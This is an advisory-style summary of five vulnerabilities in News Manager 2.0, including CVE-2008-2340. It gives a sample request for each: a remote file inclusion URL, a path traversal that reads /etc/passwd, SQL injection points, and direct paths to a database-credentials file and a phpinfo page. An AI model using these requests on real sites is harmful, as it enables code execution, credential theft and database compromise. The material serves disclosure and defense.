The provided content describes multiple vulnerabilities in News Manager 2.0, and it includes CVE-2008-2340 among others.

**Vulnerabilities:**

1.  **Remote File Inclusion (RFI):**
    *   **Weakness:** The `ch_readalso.php` script includes a remote file specified by the `read_xml_include` parameter without proper sanitization.
    *   **Attack Vector:** An attacker can include a malicious file from a remote server by manipulating the `read_xml_include` parameter.
    *   **Impact:** Arbitrary code execution on the server.
    *   **Required Capabilities:** The attacker needs to have a web server to host a malicious PHP file.
    *   **Technical Details:** `/ch_readalso.php?read_xml_include=http://localhost/020.txt`

2.  **Remote File Disclosure:**
    *   **Weakness:** The `attachments.php` script is vulnerable to path traversal.
    *   **Attack Vector:** An attacker can access sensitive files on the server by manipulating the `id` parameter.
    *   **Impact:** Disclosure of sensitive information (e.g., `/etc/passwd`).
    *  **Required Capabilities:** An unauthenticated remote attacker can perform path traversal using the 'id' parameter.
    *   **Technical Details:**
    	*   `/attachments.php?id=../../../../../../../../../../../../../etc/passwd`
    	*   `/login/attachments.php?id=`

3.  **Remote SQL Injection:**
    *   **Weakness:** Several scripts (`list_tagitems.php`, `advsearch.php`, `archive.php`, `index.php`) are vulnerable to SQL injection through the `lang` or `pid` parameters.
    *   **Attack Vector:** An attacker can inject malicious SQL code through the `lang` or `pid` parameters
    *   **Impact:** Database compromise, data exfiltration, or modification.
    *  **Required Capabilities:** An unauthenticated remote attacker can inject SQL code in the vulnerable parameters.
    *   **Technical Details:**
        *   `/list_tagitems.php?pid=-41[SQL]`
        *   `/advsearch.php?lang='[SQL]`
        *   `/archive.php?lang='[SQL]`
        *   `/index.php?lang='[SQL]`

4.  **Remote Permission Bypass:**
    *   **Weakness:** The `connect_str.php` file directly exposes database connection credentials.
    *   **Attack Vector:** An attacker can directly access the `connect_str.php` file to obtain database credentials.
    *   **Impact:** Full access to the database, including user names and passwords.
    *  **Required Capabilities:** An unauthenticated remote attacker can access the file `connect_str.php`.
    *   **Technical Details:** `/db/connect_str.php`

5.  **PHPINFO Exposure:**
    *   **Weakness:** The `info.php` script provides information about the PHP configuration.
    *   **Attack Vector:** An attacker can access the `info.php` file to obtain sensitive server information.
    *   **Impact:** Disclosure of sensitive server information which might assist in further exploitation.
    *  **Required Capabilities:** An unauthenticated remote attacker can access the file `info.php`.
    *   **Technical Details:** `/login/info.php`
